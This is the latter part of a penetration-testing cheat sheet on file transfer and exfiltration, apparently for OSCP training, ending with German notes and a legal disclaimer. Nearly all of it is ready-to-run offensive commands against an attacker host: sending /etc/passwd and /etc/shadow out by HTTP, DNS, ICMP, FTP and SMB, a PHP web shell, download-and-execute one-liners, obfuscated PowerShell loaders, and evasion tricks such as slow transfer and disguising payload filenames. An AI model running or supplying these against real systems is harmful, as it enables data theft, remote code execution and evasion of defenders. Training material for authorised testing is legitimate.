certutil -decode encoded.txt decoded.exe
```

### 58. Base64 Encode/Decode (Linux)
```bash
# Encode
base64 file.exe > encoded.txt
base64 -w 0 file.exe > encoded.txt  # No line wrapping

# Decode
base64 -d encoded.txt > decoded.exe

# One-liner
cat file.exe | base64 -w 0

# Decode from string
echo "SGVsbG8gV29ybGQ=" | base64 -d
```

### 59. Base64 Transfer Method
```bash
# Workflow:
# 1. Attacker encodes file
base64 -w 0 payload.exe > payload.b64

# 2. Copy payload.b64 content to clipboard

# 3. Target creates file and decodes
# Windows:
echo [base64_string] > payload.b64
certutil -decode payload.b64 payload.exe

# Linux:
echo [base64_string] | base64 -d > payload.exe

# For large files, split:
split -b 5000 payload.b64 chunk_
# Then reassemble and decode
```

---

## Python Transfer

### 60. Python Download Server
```python
# Simple HTTP Server (see #49)
python3 -m http.server 80

# With specific directory
cd /files
python3 -m http.server 80
```

### 61. Python Upload Server
```python
# upload.py
import http.server
import socketserver

class MyHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length)

        # Save uploaded file
        with open("uploaded_file", "wb") as f:
            f.write(body)

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Upload successful")

PORT = 8000
Handler = MyHTTPRequestHandler

with socketserver.TCPServer(("", PORT), Handler) as httpd:
    print(f"Server running on port {PORT}")
    httpd.serve_forever()

# Run:
python3 upload.py
```

### 62. Python Download Script
```python
# download.py
import urllib.request

url = "http://10.10.14.5/file.exe"
output = "file.exe"

urllib.request.urlretrieve(url, output)
print(f"Downloaded {output}")

# Execute:
python3 download.py
```

---

## PHP Transfer

### 63. PHP Download
```php
<?php
// download.php
$file = file_get_contents("http://10.10.14.5/file.exe");
file_put_contents("file.exe", $file);
echo "Downloaded";
?>

// Execute:
php download.php
```

### 64. PHP Upload Form
```php
<!-- upload.php -->
<?php
if(isset($_FILES['file'])) {
    $target_dir = "./";
    $target_file = $target_dir . basename($_FILES["file"]["name"]);

    if(move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
        echo "File uploaded: " . basename($_FILES["file"]["name"]);
    } else {
        echo "Upload failed";
    }
}
?>
<html>
<body>
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file">
        <input type="submit" value="Upload">
    </form>
</body>
</html>
```

### 65. PHP Web Shell with Upload
```php
<?php
// shell.php
if(isset($_REQUEST['cmd'])) {
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
}

if(isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "Uploaded: " . $_FILES['file']['name'];
}
?>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>
```

---

## SSH/SCP Transfer

### 66. SCP (Secure Copy)

#### Upload to Remote
```bash
# Basic upload
scp /local/file.txt user@10.10.14.5:/remote/path/

# Specific port
scp -P 2222 /local/file.txt user@10.10.14.5:/remote/path/

# With SSH key
scp -i key.pem /local/file.txt user@10.10.14.5:/remote/path/

# Recursive (directory)
scp -r /local/dir user@10.10.14.5:/remote/path/

# Verbose
scp -v /local/file.txt user@10.10.14.5:/remote/path/
```

#### Download from Remote
```bash
# Basic download
scp user@10.10.14.5:/remote/file.txt /local/path/

# Recursive
scp -r user@10.10.14.5:/remote/dir /local/path/

# With key
scp -i key.pem user@10.10.14.5:/remote/file.txt /local/path/
```

### 67. SFTP (SSH File Transfer Protocol)
```bash
# Connect
sftp user@10.10.14.5

# Commands:
put /local/file.txt          # Upload
get /remote/file.txt         # Download
ls                           # List remote
lls                          # List local
cd /remote/dir               # Change remote dir
lcd /local/dir               # Change local dir
pwd                          # Remote working dir
lpwd                         # Local working dir
mkdir dirname                # Create remote dir
quit                         # Exit
```

### 68. rsync over SSH
```bash
# Upload
rsync -avz -e ssh /local/file.txt user@10.10.14.5:/remote/path/

# Download
rsync -avz -e ssh user@10.10.14.5:/remote/file.txt /local/path/

# Recursive sync
rsync -avz -e ssh /local/dir/ user@10.10.14.5:/remote/dir/

# With SSH key
rsync -avz -e "ssh -i key.pem" /local/ user@10.10.14.5:/remote/

# Progress
rsync -avz --progress -e ssh /local/file.txt user@10.10.14.5:/remote/

# Exclude files
rsync -avz --exclude '*.log' -e ssh /local/ user@10.10.14.5:/remote/
```

---

## RDP Transfer

### 69. RDP Shared Folder
```bash
# Linux -> Windows (rdesktop)
rdesktop -r disk:share=/root/share 10.10.14.5

# xfreerdp
xfreerdp /v:10.10.14.5 /u:administrator /p:password /drive:share,/root/share

# On Windows RDP session:
# Access via \\tsclient\share\

# Copy files
copy \\tsclient\share\file.exe C:\temp\
```

### 70. RDP Clipboard
```bash
# Enable clipboard sharing
rdesktop -r clipboard:CLIPBOARD 10.10.14.5

# xfreerdp (enabled by default)
xfreerdp /v:10.10.14.5 /u:user /p:pass +clipboard

# Copy/paste text and small files
```

---

## DNS Exfiltration

### 71. DNS Tunneling (Basic)

#### DNS Server (Attacker)
```bash
# dnschef (DNS Proxy)
dnschef --fakeip 10.10.14.5 --interface 0.0.0.0 --port 53

# dnscat2 server
ruby dnscat2.rb --dns "domain=attacker.com,host=0.0.0.0,port=53"
```

#### DNS Client (Target)
```bash
# dnscat2 client
./dnscat attacker.com

# Manual DNS exfiltration
# Encode data in subdomain
data=$(cat /etc/passwd | base64 -w 0)
nslookup ${data}.attacker.com 10.10.14.5
```

### 72. DNS Data Exfiltration
```bash
# Chunk data and send via DNS queries
file_content=$(cat secret.txt | base64 -w 0)

# Split into chunks (DNS labels max 63 chars)
echo $file_content | fold -w 60 | while read line; do
    nslookup ${line}.attacker.com 10.10.14.5
done

# Attacker captures with tcpdump:
tcpdump -i eth0 -n port 53
```

---

## ICMP Exfiltration

### 73. ICMP Tunneling

#### icmpsh
```bash
# Attacker (disable ICMP replies):
sysctl -w net.ipv4.icmp_echo_ignore_all=1

# Run icmpsh server:
python icmpsh_m.py 10.10.14.5 <target_ip>

# Target:
icmpsh.exe -t 10.10.14.5
```

#### ptunnel (ICMP Tunnel)
```bash
# Server:
ptunnel -x password

# Client:
ptunnel -p <server_ip> -lp 8000 -da <destination_ip> -dp 22 -x password

# Then SSH over ICMP tunnel:
ssh -p 8000 localhost
```

### 74. ICMP Data Exfiltration
```bash
# Send data in ICMP packets
# Attacker listen:
tcpdump -i eth0 icmp -n

# Target send:
# Embed data in ping payload
ping -c 1 -p $(echo "secret data" | xxd -p) 10.10.14.5
```

---

## Alternative Transfer Methods

### 75. Email Transfer
```bash
# Send file via email (if mail configured)
echo "File content" | mail -s "Subject" -A /path/to/file.txt attacker@email.com

# Python SMTP
python3 << EOF
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

msg = MIMEMultipart()
msg['From'] = "sender@example.com"
msg['To'] = "attacker@email.com"
msg['Subject'] = "File Transfer"

part = MIMEBase('application', 'octet-stream')
part.set_payload(open("/path/to/file", "rb").read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', 'attachment; filename="file.txt"')
msg.attach(part)

server = smtplib.SMTP('smtp.example.com', 587)
server.starttls()
server.login("sender@example.com", "password")
server.send_message(msg)
server.quit()
EOF
```

### 76. Pastebin / Cloud Upload
```bash
# curl to pastebin
curl -X POST -d "content=$(cat file.txt)" https://pastebin.com/api/api_post.php

# Transfer.sh (temporary file hosting)
curl --upload-file ./file.txt https://transfer.sh/file.txt

# 0x0.st
curl -F'file=@file.txt' https://0x0.st

# File.io (one-time download)
curl -F 'file=@file.txt' https://file.io
```

### 77. Steganography
```bash
# Hide data in image
steghide embed -cf image.jpg -ef secret.txt

# Extract
steghide extract -sf image.jpg

# Transfer image via normal means, extract on attacker side
```

### 78. QR Code Transfer
```bash
# Generate QR code from file
qrencode -o qr.png < file.txt

# Screenshot QR code and decode on attacker system
zbarimg qr.png
```

---

## Data Exfiltration Techniques

### 79. HTTP POST Exfiltration
```bash
# Linux
curl -X POST -d @/etc/passwd http://10.10.14.5/exfil

# Windows PowerShell
powershell -c "Invoke-WebRequest -Uri http://10.10.14.5/exfil -Method POST -Body (Get-Content C:\file.txt)"

# With Base64 encoding
curl -X POST -d "data=$(cat /etc/shadow | base64)" http://10.10.14.5/exfil
```

### 80. HTTP Headers Exfiltration
```bash
# Exfiltrate via User-Agent header
data=$(cat secret.txt | base64 -w 0)
curl -A "$data" http://10.10.14.5/

# Via Cookie
curl -H "Cookie: data=$data" http://10.10.14.5/

# Attacker logs:
tail -f /var/log/apache2/access.log
```

### 81. SMB Exfiltration
```cmd
# Windows copy to attacker SMB
copy C:\secrets.txt \\10.10.14.5\share\

# Recursive
xcopy C:\secrets \\10.10.14.5\share\ /E /I
```

### 82. FTP Exfiltration
```bash
# Upload to FTP
curl -T /etc/passwd ftp://10.10.14.5/ --user anonymous:anonymous

# PowerShell
$client = New-Object System.Net.WebClient
$client.Credentials = New-Object System.Net.NetworkCredential("user","pass")
$client.UploadFile("ftp://10.10.14.5/file.txt", "C:\secret.txt")
```

---

## Evasion Techniques

### 83. File Transfer Evasion

#### Chunking (Split large files)
```bash
# Linux split
split -b 10M largefile.zip chunk_

# Transfer chunks
for file in chunk_*; do
    curl -T $file http://10.10.14.5/upload/$file
done

# Reassemble
cat chunk_* > largefile.zip

# Windows (certutil)
certutil -split -f largefile.exe 10000000

# Transfer and merge (PowerShell)
Get-Content chunk_* -Raw | Set-Content largefile.exe -Encoding Byte
```

#### Encoding/Encryption
```bash
# Base64 encoding (less suspicious)
base64 file.exe > file.b64
# Transfer file.b64
base64 -d file.b64 > file.exe

# XOR encoding
python3 -c "import sys; data = open('file.exe','rb').read(); key = 0xAA; encoded = bytes([b ^ key for b in data]); open('encoded.bin','wb').write(encoded)"

# Decode
python3 -c "import sys; data = open('encoded.bin','rb').read(); key = 0xAA; decoded = bytes([b ^ key for b in data]); open('decoded.exe','wb').write(decoded)"
```

#### Rename to innocent extension
```bash
# Rename .exe to .jpg
mv payload.exe document.jpg

# Transfer
curl http://10.10.14.5/document.jpg -o document.jpg

# Rename back
mv document.jpg payload.exe
```

#### HTTPS (Encrypted transfer)
```bash
# Use HTTPS instead of HTTP
# Harder to inspect by network monitoring

# Python HTTPS server (see #49)
# Download via HTTPS
curl -k https://10.10.14.5/file.exe -o file.exe
```

### 84. Time-based Transfer (Slow exfiltration)
```bash
# Slow transfer to avoid detection
# Transfer in small chunks with delays

for chunk in chunk_*; do
    curl -T $chunk http://10.10.14.5/upload/
    sleep 300  # 5 min delay
done
```

### 85. Obfuscated Downloads
```bash
# PowerShell obfuscation
# Instead of:
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/script.ps1')

# Use:
$a='http://'; $b='10.10.14.5/script.ps1'; IEX(New-Object Net.WebClient).DownloadString($a+$b)

# Variable obfuscation
$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://10.10.14.5/file.exe','file.exe')
```

---

## Large File Transfer

### 86. Compression before Transfer
```bash
# Linux compress
tar czf archive.tar.gz /path/to/large/files
gzip largefile.txt

# Transfer compressed
curl -T archive.tar.gz http://10.10.14.5/upload/

# Decompress
tar xzf archive.tar.gz
gunzip largefile.txt.gz

# Windows compress (PowerShell)
Compress-Archive -Path C:\files\* -DestinationPath C:\archive.zip

# Decompress
Expand-Archive -Path archive.zip -DestinationPath C:\files\
```

### 87. Resumable Transfer
```bash
# wget with continue
wget -c http://10.10.14.5/largefile.zip

# curl with resume
curl -C - -O http://10.10.14.5/largefile.zip

# rsync (automatically resumes)
rsync -avz --partial http://10.10.14.5/largefile.zip .
```

### 88. Parallel Transfer
```bash
# aria2 multi-connection download
aria2c -x 10 http://10.10.14.5/largefile.zip

# axel
axel -n 10 http://10.10.14.5/largefile.zip
```

---

## Cheat Sheet Quick Reference

### Top Windows Download Methods
```cmd
# 1. PowerShell (Most common)
powershell -c "IWR -UseBasicParsing http://10.10.14.5/file.exe -OutFile file.exe"

# 2. Certutil (Native, stealthy)
certutil -urlcache -f http://10.10.14.5/file.exe file.exe

# 3. BITSAdmin (Background transfer)
bitsadmin /transfer job /download /priority high http://10.10.14.5/file.exe C:\file.exe

# 4. curl (Windows 10+)
curl http://10.10.14.5/file.exe -o file.exe

# 5. SMB Copy
copy \\10.10.14.5\share\file.exe C:\file.exe
```

### Top Linux Download Methods
```bash
# 1. wget (Most reliable)
wget http://10.10.14.5/file.sh -O file.sh

# 2. curl
curl http://10.10.14.5/file.sh -o file.sh

# 3. Download and execute
curl http://10.10.14.5/script.sh | bash

# 4. Python
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://10.10.14.5/file.sh", "file.sh")'

# 5. Netcat
nc -lvnp 4444 > file.sh
# Sender: nc <target_ip> 4444 < file.sh
```

### Top Upload Methods
```bash
# Windows
powershell -c "(New-Object System.Net.WebClient).UploadFile('http://10.10.14.5/upload', 'file.txt')"
curl -X POST -F "file=@C:\file.txt" http://10.10.14.5/upload

# Linux
curl -X POST -F "file=@/path/file.txt" http://10.10.14.5/upload
nc <attacker_ip> 4444 < file.txt
```

### Stealth Transfer
```bash
# HTTPS (encrypted)
curl -k https://10.10.14.5/file.exe -o file.exe

# DNS Exfiltration
nslookup $(cat secret.txt | base64).attacker.com

# SMB (blends with Windows traffic)
copy \\10.10.14.5\share\file.exe C:\file.exe

# Base64 (text-only channels)
echo [base64] | certutil -decode - file.exe
```

---

## Wichtige Hinweise

- **AV/EDR**: Viele Transfer-Methoden werden geloggt (PowerShell, Certutil, etc.)
- **Network Monitoring**: HTTP Downloads sind sichtbar - HTTPS verwenden
- **Living Off The Land**: Native Binaries (LOLBins) bevorzugen
- **File Size**: Große Files komprimieren vor Transfer
- **Cleanup**: Temporäre Files löschen nach Transfer
- **Encoding**: Base64 für text-only channels
- **Alternative Protocols**: DNS, ICMP für schwierige Umgebungen
- **Rate Limiting**: Langsamer Transfer weniger auffällig
- **Naming**: Innocent filenames verwenden (document.pdf statt payload.exe)

---

## Rechtliche Hinweise

Diese Methoden dürfen NUR verwendet werden für:
- Autorisierte Penetrationstests mit schriftlicher Genehmigung
- CTF-Wettbewerbe und Security Challenges
- Forensische Analysen auf eigenen Systemen
- Sicherheitsforschung in kontrollierten Umgebungen
- Defensive Security und Incident Response

Unbefugte Nutzung verstößt gegen CFAA (USA), Computer Misuse Act (UK), StGB §202a-c (DE) und ähnliche Gesetze weltweit.

---

**Erstellt**: 2025-10-30
**System**: Multi-Platform
**Kontext**: Autorisierter Penetrationstest / OSCP Training
